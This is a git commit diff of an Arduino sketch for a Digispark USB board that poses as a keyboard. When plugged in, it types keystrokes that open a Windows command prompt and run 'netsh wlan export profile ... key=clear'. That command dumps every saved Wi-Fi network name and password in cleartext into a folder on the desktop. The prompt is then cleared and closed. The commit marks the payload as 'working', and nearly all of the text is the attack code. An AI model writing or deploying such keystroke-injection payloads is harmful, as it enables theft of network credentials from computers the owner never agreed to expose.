9683495a8b19c2e2fdaeca7a38b61d9653dabbe0
ylehilds <lehi_alcantara@byu.edu>
2026-03-22 02:06:27 -0600

    'working'

--- SavedWifiPasswords/SavedWifiPasswords.ino
+++ SavedWifiPasswords/SavedWifiPasswords.ino
@@ -1,29 +1,31 @@
 #include "DigiKeyboard.h"
 
 void setup() {
-  pinMode(1,OUTPUT);
-}
+  pinMode(1, OUTPUT);
 
-void loop() {
-
-  DigiKeyboard.update();
   DigiKeyboard.sendKeyStroke(0);
-  DigiKeyboard.delay(3000); /*Pauses for 3 seconds to ensure Windows has fully recognized the USB device before commands start*/
-  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); /*Simulates pressing the Windows Key + R to open the "Run" dialog box*/
-  DigiKeyboard.delay(500);
-  DigiKeyboard.println("cmd /k mode"); /*Types cmd /k mode into the Run box and presses Enter. This opens a Command Prompt window and uses the /k switch (keep open) so subsequent commands are typed into this persistent black window rather than opening a new Run dialog box*/
-  DigiKeyboard.delay(500);
-  DigiKeyboard.println("mkdir \"C:\\Users\\%USERNAME%\\Desktop\\WiFi_Passwords"); /*Creates the Wifi_Passwords folder where specified*/
-  DigiKeyboard.delay(1500);
-  DigiKeyboard.println("netsh wlan export profile folder=C:\\Users\\%USERNAME%\\Desktop\\WiFi_Passwords key=clear");/*saved .xml files of each network profile in C:\Users\%USERNAME%\Desktop\WiFi_Passwords so you can click on each profile and look for the <name> for the SSID and <keymaterial> for the cleartext password that is saved for each wifi password*/
-  DigiKeyboard.delay(4000);
-  DigiKeyboard.println("cls"); /*Clears all commands in CMD*/
-  DigiKeyboard.delay(4000);
-  DigiKeyboard.println("exit");/*exits out of CMD*/
+  DigiKeyboard.delay(3000);
 
-  DigiKeyboard.delay(200);
-  digitalWrite(1,HIGH); /*Turns on the LED*/
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(1500);
+
+  DigiKeyboard.println("cmd");
+  DigiKeyboard.delay(2000);
+
+  DigiKeyboard.println("mkdir \"C:\\Users\\%USERNAME%\\Desktop\\WiFi_Passwords\"");
+  DigiKeyboard.delay(1500);
+
+  DigiKeyboard.println("netsh wlan export profile folder=\"C:\\Users\\%USERNAME%\\Desktop\\WiFi_Passwords\" key=clear");
+  DigiKeyboard.delay(4000);
+
+  DigiKeyboard.println("cls");
+  DigiKeyboard.delay(1000);
+
+  DigiKeyboard.println("exit");
+
+  digitalWrite(1, HIGH);
   DigiKeyboard.delay(50);
-  digitalWrite(1,LOW); /*Turns off the LED*/
-  DigiKeyboard.delay(300000);
+  digitalWrite(1, LOW);
 }
+
+void loop() {}
